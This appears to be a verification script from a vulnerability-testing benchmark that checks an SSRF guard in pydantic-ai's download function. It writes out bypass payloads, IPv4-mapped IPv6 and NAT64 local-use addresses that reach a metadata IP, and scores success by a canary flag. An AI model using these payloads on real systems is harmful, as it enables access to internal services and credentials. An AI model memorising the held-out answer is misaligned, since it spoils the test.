#!/usr/bin/env bash
# verify.sh (PCBV2-0178 pydantic-ai-cve-2026-48782) — 定制 seed/residual 双分支
# 机制: REAL pydantic-ai download_item -> safe_download SSRF guard (CWE-918)。
#   seed    : IPv4-mapped IPv6 (::ffff:100.100.100.200), CVE-2026-46678
#               v0(1.56.0)  字符串黑名单无归一化 -> 放行 -> canary -> flag  rc=0
#               v1(1.99.0)  _normalize_ip 解 ipv4_mapped -> 阻断            rc=10
#   residual: NAT64 RFC 8215 local-use (64:ff9b:1::6464:64c8), CVE-2026-48782
#               v1(1.99.0)  _normalize_ip 不解 /48 local-use 前缀 -> 放行 -> canary -> flag rc=0
# 判定: canary 类(ssrf_sidecar) -> RUN_FLAG（容器内植入值）。效果通道 = /fetch 返回体
#       （fetched_body 含 canary 回显的 flag）。seed/residual 共用同一判定。
# 退出码: 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# ---- candidate 生成（seed=公开 PoC；residual=内嵌字面量，不引用 hidden 文件）----
if [[ "$MODE" == "--seed" ]]; then
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null \
    || { echo "original_poc.py 生成 candidate 失败" >&2; exit 20; }
else
  # residual candidate = _heldout/bypass_poc.py 的 candidate()
  # (cve-2026-48782-nat64-localuse-metadata)；与 seed_exec 契约一致：
  # {target_url, allow_local}（method/endpoint 字段 seed_exec 固定 /fetch 不使用）。
  cat > "$WORK_DIR/cand.json" <<'JSON'
{"probe_id": "cve-2026-48782-nat64-localuse-metadata", "method": "GET", "endpoint": "/fetch", "target_url": "http://[64:ff9b:1::6464:64c8]/", "allow_local": true}
JSON
fi

# ---- 通用后处理（幂等；residual 无 PCBFLAG_ token 时为空操作）----
# flag placeholder replace (file-based)
"$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
# wrap non-JSON candidate into multi-field dict (file-based)
"$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2

# ---- 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）----
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# 就绪等待（容器内 pip 启动；平台 readiness 之外本地测试兜底）
if [[ -n "$_DYN" ]]; then
  for _ in $(seq 1 60); do
    if curl -s -o /dev/null -m 2 "http://127.0.0.1:$_DYN/" 2>/dev/null; then break; fi
    sleep 2
  done
fi

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or d.get('location') or '')
sys.exit(0 if '$RUN_FLAG' in body else 10)" "$OUT"
